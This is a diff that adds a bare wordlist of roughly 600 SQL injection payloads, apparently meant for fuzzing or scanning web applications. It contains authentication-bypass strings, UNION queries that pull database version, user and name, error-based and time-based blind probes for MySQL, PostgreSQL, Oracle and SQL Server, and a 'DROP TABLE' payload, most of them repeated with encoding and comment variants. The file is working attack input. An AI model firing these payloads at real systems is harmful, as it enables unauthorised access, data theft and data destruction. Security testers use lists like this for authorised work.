@@ -1,0 +1,598 @@
+' OR 1=1--
+' OR 1=1----
+' OR 1=1--#
+' OR 1=1--/*
+' OR 1=1--%0a
+' OR 1=1--%00
+'' OR 1=1--
+'' OR 1=1----
+'' OR 1=1--#
+'' OR 1=1--/*
+'' OR 1=1--%0a
+'' OR 1=1--%00
+"' OR 1=1--
+"' OR 1=1----
+"' OR 1=1--#
+"' OR 1=1--/*
+"' OR 1=1--%0a
+"' OR 1=1--%00
+' OR 1=1--;
+' OR 1=1--'
+' OR 1=1--"
+' OR 1=1--)
+' OR 1=1-- //
+X-' OR 1=1--
+X-' OR 1=1--;
+X-' OR 1=1--'
+X-' OR 1=1--"
+X-' OR 1=1--)
+X-' OR 1=1-- //
+test-' OR 1=1--
+test-' OR 1=1--;
+test-' OR 1=1--'
+test-' OR 1=1--"
+test-' OR 1=1--)
+test-' OR 1=1-- //
+%27%20OR%201%3D1--
+%2527%2520OR%25201%253D1--
+'%20OR%201=1--
+'+OR+1=1--
+'/**/OR/**/1=1--
+' or 1=1--
+" OR 1=1--
+" OR 1=1----
+" OR 1=1--#
+" OR 1=1--/*
+" OR 1=1--%0a
+" OR 1=1--%00
+'" OR 1=1--
+'" OR 1=1----
+'" OR 1=1--#
+'" OR 1=1--/*
+'" OR 1=1--%0a
+'" OR 1=1--%00
+"" OR 1=1--
+"" OR 1=1----
+"" OR 1=1--#
+"" OR 1=1--/*
+"" OR 1=1--%0a
+"" OR 1=1--%00
+" OR 1=1--;
+" OR 1=1--'
+" OR 1=1--"
+" OR 1=1--)
+" OR 1=1-- //
+X-" OR 1=1--
+X-" OR 1=1--;
+X-" OR 1=1--'
+X-" OR 1=1--"
+X-" OR 1=1--)
+X-" OR 1=1-- //
+test-" OR 1=1--
+test-" OR 1=1--;
+test-" OR 1=1--'
+test-" OR 1=1--"
+test-" OR 1=1--)
+test-" OR 1=1-- //
+%22%20OR%201%3D1--
+%2522%2520OR%25201%253D1--
+"%20OR%201=1--
+"+OR+1=1--
+"/**/OR/**/1=1--
+" or 1=1--
+' OR '1'='1'--
+' OR '1'='1'----
+' OR '1'='1'--#
+' OR '1'='1'--/*
+' OR '1'='1'--%0a
+' OR '1'='1'--%00
+'' OR '1'='1'--
+'' OR '1'='1'----
+'' OR '1'='1'--#
+'' OR '1'='1'--/*
+'' OR '1'='1'--%0a
+'' OR '1'='1'--%00
+"' OR '1'='1'--
+"' OR '1'='1'----
+"' OR '1'='1'--#
+"' OR '1'='1'--/*
+"' OR '1'='1'--%0a
+"' OR '1'='1'--%00
+' OR '1'='1'--;
+' OR '1'='1'--'
+' OR '1'='1'--"
+' OR '1'='1'--)
+' OR '1'='1'-- //
+X-' OR '1'='1'--
+X-' OR '1'='1'--;
+X-' OR '1'='1'--'
+X-' OR '1'='1'--"
+X-' OR '1'='1'--)
+X-' OR '1'='1'-- //
+test-' OR '1'='1'--
+test-' OR '1'='1'--;
+test-' OR '1'='1'--'
+test-' OR '1'='1'--"
+test-' OR '1'='1'--)
+test-' OR '1'='1'-- //
+%27%20OR%20%271%27%3D%271%27--
+%2527%2520OR%2520%25271%2527%253D%25271%2527--
+'%20OR%20'1'='1'--
+'+OR+'1'='1'--
+'/**/OR/**/'1'='1'--
+' or '1'='1'--
+') OR ('1'='1' -- -
+') OR ('1'='1' -- ---
+') OR ('1'='1' -- -#
+') OR ('1'='1' -- -/*
+') OR ('1'='1' -- -%0a
+') OR ('1'='1' -- -%00
+'') OR ('1'='1' -- -
+'') OR ('1'='1' -- ---
+'') OR ('1'='1' -- -#
+'') OR ('1'='1' -- -/*
+'') OR ('1'='1' -- -%0a
+'') OR ('1'='1' -- -%00
+"') OR ('1'='1' -- -
+"') OR ('1'='1' -- ---
+"') OR ('1'='1' -- -#
+"') OR ('1'='1' -- -/*
+"') OR ('1'='1' -- -%0a
+"') OR ('1'='1' -- -%00
+') OR ('1'='1' -- -;
+') OR ('1'='1' -- -'
+') OR ('1'='1' -- -"
+') OR ('1'='1' -- -)
+') OR ('1'='1' -- - //
+X-') OR ('1'='1' -- -
+X-') OR ('1'='1' -- -;
+X-') OR ('1'='1' -- -'
+X-') OR ('1'='1' -- -"
+X-') OR ('1'='1' -- -)
+X-') OR ('1'='1' -- - //
+test-') OR ('1'='1' -- -
+test-') OR ('1'='1' -- -;
+test-') OR ('1'='1' -- -'
+test-') OR ('1'='1' -- -"
+test-') OR ('1'='1' -- -)
+test-') OR ('1'='1' -- - //
+%27%29%20OR%20%28%271%27%3D%271%27%20--%20-
+%2527%2529%2520OR%2520%2528%25271%2527%253D%25271%2527%2520--%2520-
+')%20OR%20('1'='1'%20--%20-
+')+OR+('1'='1'+--+-
+')/**/OR/**/('1'='1'/**/--/**/-
+') or ('1'='1' -- -
+' OR 1=1#
+' OR 1=1#--
+' OR 1=1##
+' OR 1=1#/*
+' OR 1=1#%0a
+' OR 1=1#%00
+'' OR 1=1#
+'' OR 1=1#--
+'' OR 1=1##
+'' OR 1=1#/*
+'' OR 1=1#%0a
+'' OR 1=1#%00
+"' OR 1=1#
+"' OR 1=1#--
+"' OR 1=1##
+"' OR 1=1#/*
+"' OR 1=1#%0a
+"' OR 1=1#%00
+' OR 1=1#;
+' OR 1=1#'
+' OR 1=1#"
+' OR 1=1#)
+' OR 1=1# //
+X-' OR 1=1#
+X-' OR 1=1#;
+X-' OR 1=1#'
+X-' OR 1=1#"
+X-' OR 1=1#)
+X-' OR 1=1# //
+test-' OR 1=1#
+test-' OR 1=1#;
+test-' OR 1=1#'
+test-' OR 1=1#"
+test-' OR 1=1#)
+test-' OR 1=1# //
+%27%20OR%201%3D1%23
+%2527%2520OR%25201%253D1%2523
+'%20OR%201=1#
+'+OR+1=1#
+'/**/OR/**/1=1#
+' or 1=1#
+' OR 1=1/*
+' OR 1=1/*--
+' OR 1=1/*#
+' OR 1=1/*/*
+' OR 1=1/*%0a
+' OR 1=1/*%00
+'' OR 1=1/*
+'' OR 1=1/*--
+'' OR 1=1/*#
+'' OR 1=1/*/*
+'' OR 1=1/*%0a
+'' OR 1=1/*%00
+"' OR 1=1/*
+"' OR 1=1/*--
+"' OR 1=1/*#
+"' OR 1=1/*/*
+"' OR 1=1/*%0a
+"' OR 1=1/*%00
+' OR 1=1/*;
+' OR 1=1/*'
+' OR 1=1/*"
+' OR 1=1/*)
+' OR 1=1/* //
+X-' OR 1=1/*
+X-' OR 1=1/*;
+X-' OR 1=1/*'
+X-' OR 1=1/*"
+X-' OR 1=1/*)
+X-' OR 1=1/* //
+test-' OR 1=1/*
+test-' OR 1=1/*;
+test-' OR 1=1/*'
+test-' OR 1=1/*"
+test-' OR 1=1/*)
+test-' OR 1=1/* //
+%27%20OR%201%3D1%2F%2A
+%2527%2520OR%25201%253D1%252F%252A
+'%20OR%201=1/*
+'+OR+1=1/*
+'/**/OR/**/1=1/*
+' or 1=1/*
+' UNION SELECT NULL--
+' UNION SELECT NULL----
+' UNION SELECT NULL--#
+' UNION SELECT NULL--/*
+' UNION SELECT NULL--%0a
+' UNION SELECT NULL--%00
+'' UNION SELECT NULL--
+'' UNION SELECT NULL----
+'' UNION SELECT NULL--#
+'' UNION SELECT NULL--/*
+'' UNION SELECT NULL--%0a
+'' UNION SELECT NULL--%00
+"' UNION SELECT NULL--
+"' UNION SELECT NULL----
+"' UNION SELECT NULL--#
+"' UNION SELECT NULL--/*
+"' UNION SELECT NULL--%0a
+"' UNION SELECT NULL--%00
+' UNION SELECT NULL--;
+' UNION SELECT NULL--'
+' UNION SELECT NULL--"
+' UNION SELECT NULL--)
+' UNION SELECT NULL-- //
+X-' UNION SELECT NULL--
+X-' UNION SELECT NULL--;
+X-' UNION SELECT NULL--'
+X-' UNION SELECT NULL--"
+X-' UNION SELECT NULL--)
+X-' UNION SELECT NULL-- //
+test-' UNION SELECT NULL--
+test-' UNION SELECT NULL--;
+test-' UNION SELECT NULL--'
+test-' UNION SELECT NULL--"
+test-' UNION SELECT NULL--)
+test-' UNION SELECT NULL-- //
+%27%20UNION%20SELECT%20NULL--
+%2527%2520UNION%2520SELECT%2520NULL--
+'%20UNION%20SELECT%20NULL--
+'+UNION+SELECT+NULL--
+'/**/UNION/**/SELECT/**/NULL--
+' union select null--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3----
+' UNION SELECT 1,2,3--#
+' UNION SELECT 1,2,3--/*
+' UNION SELECT 1,2,3--%0a
+' UNION SELECT 1,2,3--%00
+'' UNION SELECT 1,2,3--
+'' UNION SELECT 1,2,3----
+'' UNION SELECT 1,2,3--#
+'' UNION SELECT 1,2,3--/*
+'' UNION SELECT 1,2,3--%0a
+'' UNION SELECT 1,2,3--%00
+"' UNION SELECT 1,2,3--
+"' UNION SELECT 1,2,3----
+"' UNION SELECT 1,2,3--#
+"' UNION SELECT 1,2,3--/*
+"' UNION SELECT 1,2,3--%0a
+"' UNION SELECT 1,2,3--%00
+' UNION SELECT 1,2,3--;
+' UNION SELECT 1,2,3--'
+' UNION SELECT 1,2,3--"
+' UNION SELECT 1,2,3--)
+' UNION SELECT 1,2,3-- //
+X-' UNION SELECT 1,2,3--
+X-' UNION SELECT 1,2,3--;
+X-' UNION SELECT 1,2,3--'
+X-' UNION SELECT 1,2,3--"
+X-' UNION SELECT 1,2,3--)
+X-' UNION SELECT 1,2,3-- //
+test-' UNION SELECT 1,2,3--
+test-' UNION SELECT 1,2,3--;
+test-' UNION SELECT 1,2,3--'
+test-' UNION SELECT 1,2,3--"
+test-' UNION SELECT 1,2,3--)
+test-' UNION SELECT 1,2,3-- //
+%27%20UNION%20SELECT%201%2C2%2C3--
+%2527%2520UNION%2520SELECT%25201%252C2%252C3--
+'%20UNION%20SELECT%201,2,3--
+'+UNION+SELECT+1,2,3--
+'/**/UNION/**/SELECT/**/1,2,3--
+' union select 1,2,3--
+' UNION SELECT @@version, user(), database()--
+' UNION SELECT @@version, user(), database()----
+' UNION SELECT @@version, user(), database()--#
+' UNION SELECT @@version, user(), database()--/*
+' UNION SELECT @@version, user(), database()--%0a
+' UNION SELECT @@version, user(), database()--%00
+'' UNION SELECT @@version, user(), database()--
+'' UNION SELECT @@version, user(), database()----
+'' UNION SELECT @@version, user(), database()--#
+'' UNION SELECT @@version, user(), database()--/*
+'' UNION SELECT @@version, user(), database()--%0a
+'' UNION SELECT @@version, user(), database()--%00
+"' UNION SELECT @@version, user(), database()--
+"' UNION SELECT @@version, user(), database()----
+"' UNION SELECT @@version, user(), database()--#
+"' UNION SELECT @@version, user(), database()--/*
+"' UNION SELECT @@version, user(), database()--%0a
+"' UNION SELECT @@version, user(), database()--%00
+' UNION SELECT @@version, user(), database()--;
+' UNION SELECT @@version, user(), database()--'
+' UNION SELECT @@version, user(), database()--"
+' UNION SELECT @@version, user(), database()--)
+' UNION SELECT @@version, user(), database()-- //
+X-' UNION SELECT @@version, user(), database()--
+X-' UNION SELECT @@version, user(), database()--;
+X-' UNION SELECT @@version, user(), database()--'
+X-' UNION SELECT @@version, user(), database()--"
+X-' UNION SELECT @@version, user(), database()--)
+X-' UNION SELECT @@version, user(), database()-- //
+test-' UNION SELECT @@version, user(), database()--
+test-' UNION SELECT @@version, user(), database()--;
+test-' UNION SELECT @@version, user(), database()--'
+test-' UNION SELECT @@version, user(), database()--"
+test-' UNION SELECT @@version, user(), database()--)
+test-' UNION SELECT @@version, user(), database()-- //
+%27%20UNION%20SELECT%20%40%40version%2C%20user%28%29%2C%20database%28%29--
+%2527%2520UNION%2520SELECT%2520%2540%2540version%252C%2520user%2528%2529%252C%2520database%2528%2529--
+'%20UNION%20SELECT%20@@version,%20user(),%20database()--
+'+UNION+SELECT+@@version,+user(),+database()--
+'/**/UNION/**/SELECT/**/@@version,/**/user(),/**/database()--
+' union select @@VERSION, USER(), DATABASE()--
+' UNION SELECT @@VeRsIoN, uSeR(), dAtAbAsE()--
+' || to_char(1/0) || '
+' || to_char(1/0) || '--
+' || to_char(1/0) || '#
+' || to_char(1/0) || '/*
+' || to_char(1/0) || '%0a
+' || to_char(1/0) || '%00
+'' || to_char(1/0) || '
+'' || to_char(1/0) || '--
+'' || to_char(1/0) || '#
+'' || to_char(1/0) || '/*
+'' || to_char(1/0) || '%0a
+'' || to_char(1/0) || '%00
+"' || to_char(1/0) || '
+"' || to_char(1/0) || '--
+"' || to_char(1/0) || '#
+"' || to_char(1/0) || '/*
+"' || to_char(1/0) || '%0a
+"' || to_char(1/0) || '%00
+' || to_char(1/0) || ';
+' || to_char(1/0) || ''
+' || to_char(1/0) || '"
+' || to_char(1/0) || ')
+' || to_char(1/0) || ' //
+X-' || to_char(1/0) || '
+X-' || to_char(1/0) || ';
+X-' || to_char(1/0) || ''
+X-' || to_char(1/0) || '"
+X-' || to_char(1/0) || ')
+X-' || to_char(1/0) || ' //
+test-' || to_char(1/0) || '
+test-' || to_char(1/0) || ';
+test-' || to_char(1/0) || ''
+test-' || to_char(1/0) || '"
+test-' || to_char(1/0) || ')
+test-' || to_char(1/0) || ' //
+%27%20%7C%7C%20to_char%281%2F0%29%20%7C%7C%20%27
+%2527%2520%257C%257C%2520to_char%25281%252F0%2529%2520%257C%257C%2520%2527
+'%20||%20to_char(1/0)%20||%20'
+'+||+to_char(1/0)+||+'
+'/**/||/**/to_char(1/0)/**/||/**/'
+' || TO_CHAR(1/0) || '
+' || To_cHaR(1/0) || '
+'||(SELECT 1/0)||'
+'||(SELECT 1/0)||'--
+'||(SELECT 1/0)||'#
+'||(SELECT 1/0)||'/*
+'||(SELECT 1/0)||'%0a
+'||(SELECT 1/0)||'%00
+''||(SELECT 1/0)||'
+''||(SELECT 1/0)||'--
+''||(SELECT 1/0)||'#
+''||(SELECT 1/0)||'/*
+''||(SELECT 1/0)||'%0a
+''||(SELECT 1/0)||'%00
+"'||(SELECT 1/0)||'
+"'||(SELECT 1/0)||'--
+"'||(SELECT 1/0)||'#
+"'||(SELECT 1/0)||'/*
+"'||(SELECT 1/0)||'%0a
+"'||(SELECT 1/0)||'%00
+'||(SELECT 1/0)||';
+'||(SELECT 1/0)||''
+'||(SELECT 1/0)||'"
+'||(SELECT 1/0)||')
+'||(SELECT 1/0)||' //
+X-'||(SELECT 1/0)||'
+X-'||(SELECT 1/0)||';
+X-'||(SELECT 1/0)||''
+X-'||(SELECT 1/0)||'"
+X-'||(SELECT 1/0)||')
+X-'||(SELECT 1/0)||' //
+test-'||(SELECT 1/0)||'
+test-'||(SELECT 1/0)||';
+test-'||(SELECT 1/0)||''
+test-'||(SELECT 1/0)||'"
+test-'||(SELECT 1/0)||')
+test-'||(SELECT 1/0)||' //
+%27%7C%7C%28SELECT%201%2F0%29%7C%7C%27
+%2527%257C%257C%2528SELECT%25201%252F0%2529%257C%257C%2527
+'||(SELECT%201/0)||'
+'||(SELECT+1/0)||'
+'||(SELECT/**/1/0)||'
+'||(select 1/0)||'
+'; SELECT pg_sleep(5)--
+'; SELECT pg_sleep(5)----
+'; SELECT pg_sleep(5)--#
+'; SELECT pg_sleep(5)--/*
+'; SELECT pg_sleep(5)--%0a
+'; SELECT pg_sleep(5)--%00
+''; SELECT pg_sleep(5)--
+''; SELECT pg_sleep(5)----
+''; SELECT pg_sleep(5)--#
+''; SELECT pg_sleep(5)--/*
+''; SELECT pg_sleep(5)--%0a
+''; SELECT pg_sleep(5)--%00
+"'; SELECT pg_sleep(5)--
+"'; SELECT pg_sleep(5)----
+"'; SELECT pg_sleep(5)--#
+"'; SELECT pg_sleep(5)--/*
+"'; SELECT pg_sleep(5)--%0a
+"'; SELECT pg_sleep(5)--%00
+'; SELECT pg_sleep(5)--;
+'; SELECT pg_sleep(5)--'
+'; SELECT pg_sleep(5)--"
+'; SELECT pg_sleep(5)--)
+'; SELECT pg_sleep(5)-- //
+X-'; SELECT pg_sleep(5)--
+X-'; SELECT pg_sleep(5)--;
+X-'; SELECT pg_sleep(5)--'
+X-'; SELECT pg_sleep(5)--"
+X-'; SELECT pg_sleep(5)--)
+X-'; SELECT pg_sleep(5)-- //
+test-'; SELECT pg_sleep(5)--
+test-'; SELECT pg_sleep(5)--;
+test-'; SELECT pg_sleep(5)--'
+test-'; SELECT pg_sleep(5)--"
+test-'; SELECT pg_sleep(5)--)
+test-'; SELECT pg_sleep(5)-- //
+%27%3B%20SELECT%20pg_sleep%285%29--
+%2527%253B%2520SELECT%2520pg_sleep%25285%2529--
+';%20SELECT%20pg_sleep(5)--
+';+SELECT+pg_sleep(5)--
+';/**/SELECT/**/pg_sleep(5)--
+'; select PG_SLEEP(5)--
+'; SELECT pG_SlEeP(5)--
+"; SELECT sleep(5)#
+"; SELECT sleep(5)#--
+"; SELECT sleep(5)##
+"; SELECT sleep(5)#/*
+"; SELECT sleep(5)#%0a
+"; SELECT sleep(5)#%00
+'"; SELECT sleep(5)#
+'"; SELECT sleep(5)#--
+'"; SELECT sleep(5)##
+'"; SELECT sleep(5)#/*
+'"; SELECT sleep(5)#%0a
+'"; SELECT sleep(5)#%00
+""; SELECT sleep(5)#
+""; SELECT sleep(5)#--
+""; SELECT sleep(5)##
+""; SELECT sleep(5)#/*
+""; SELECT sleep(5)#%0a
+""; SELECT sleep(5)#%00
+"; SELECT sleep(5)#;
+"; SELECT sleep(5)#'
+"; SELECT sleep(5)#"
+"; SELECT sleep(5)#)
+"; SELECT sleep(5)# //
+X-"; SELECT sleep(5)#
+X-"; SELECT sleep(5)#;
+X-"; SELECT sleep(5)#'
+X-"; SELECT sleep(5)#"
+X-"; SELECT sleep(5)#)
+X-"; SELECT sleep(5)# //
+test-"; SELECT sleep(5)#
+test-"; SELECT sleep(5)#;
+test-"; SELECT sleep(5)#'
+test-"; SELECT sleep(5)#"
+test-"; SELECT sleep(5)#)
+test-"; SELECT sleep(5)# //
+%22%3B%20SELECT%20sleep%285%29%23
+%2522%253B%2520SELECT%2520sleep%25285%2529%2523
+";%20SELECT%20sleep(5)#
+";+SELECT+sleep(5)#
+";/**/SELECT/**/sleep(5)#
+"; select SLEEP(5)#
+"; SELECT sLeEp(5)#
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:5'----
+'; WAITFOR DELAY '0:0:5'--#
+'; WAITFOR DELAY '0:0:5'--/*
+'; WAITFOR DELAY '0:0:5'--%0a
+'; WAITFOR DELAY '0:0:5'--%00
+''; WAITFOR DELAY '0:0:5'--
+''; WAITFOR DELAY '0:0:5'----
+''; WAITFOR DELAY '0:0:5'--#
+''; WAITFOR DELAY '0:0:5'--/*
+''; WAITFOR DELAY '0:0:5'--%0a
+''; WAITFOR DELAY '0:0:5'--%00
+"'; WAITFOR DELAY '0:0:5'--
+"'; WAITFOR DELAY '0:0:5'----
+"'; WAITFOR DELAY '0:0:5'--#
+"'; WAITFOR DELAY '0:0:5'--/*
+"'; WAITFOR DELAY '0:0:5'--%0a
+"'; WAITFOR DELAY '0:0:5'--%00
+'; WAITFOR DELAY '0:0:5'--;
+'; WAITFOR DELAY '0:0:5'--'
+'; WAITFOR DELAY '0:0:5'--"
+'; WAITFOR DELAY '0:0:5'--)
+'; WAITFOR DELAY '0:0:5'-- //
+X-'; WAITFOR DELAY '0:0:5'--
+X-'; WAITFOR DELAY '0:0:5'--;
+X-'; WAITFOR DELAY '0:0:5'--'
+X-'; WAITFOR DELAY '0:0:5'--"
+X-'; WAITFOR DELAY '0:0:5'--)
+X-'; WAITFOR DELAY '0:0:5'-- //
+test-'; WAITFOR DELAY '0:0:5'--
+test-'; WAITFOR DELAY '0:0:5'--;
+test-'; WAITFOR DELAY '0:0:5'--'
+test-'; WAITFOR DELAY '0:0:5'--"
+test-'; WAITFOR DELAY '0:0:5'--)
+test-'; WAITFOR DELAY '0:0:5'-- //
+%27%3B%20WAITFOR%20DELAY%20%270%3A0%3A5%27--
+%2527%253B%2520WAITFOR%2520DELAY%2520%25270%253A0%253A5%2527--
+';%20WAITFOR%20DELAY%20'0:0:5'--
+';+WAITFOR+DELAY+'0:0:5'--
+';/**/WAITFOR/**/DELAY/**/'0:0:5'--
+'; waitfor delay '0:0:5'--
+' AND 1=1-- -
+' AND 1=2-- -
+" AND 1=1-- -
+" AND 1=2-- -
+' and updatexml(1,concat(0x7e,(SELECT user())),1)-- -
+'; SELECT pg_sleep(3)-- -
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE 0 END-- -
+"; SELECT SLEEP(3)#
+') WAITFOR DELAY '0:0:3'--
+';DROP TABLE test-- -
+';SELECT version()-- -
+' UNION SELECT NULL-- -
+' UNION SELECT 1-- -
+' UNION SELECT 1,2-- -
+' UNION SELECT 1,2,3,4-- -
+1' ORDER BY 10-- -
+1' ORDER BY 5-- -
+1' ORDER BY 1-- -
+' OR JSON_EXTRACT('[1,2,3]','$[0]')=1-- -
+'; IF (1=1) WAITFOR DELAY '0:0:2'--
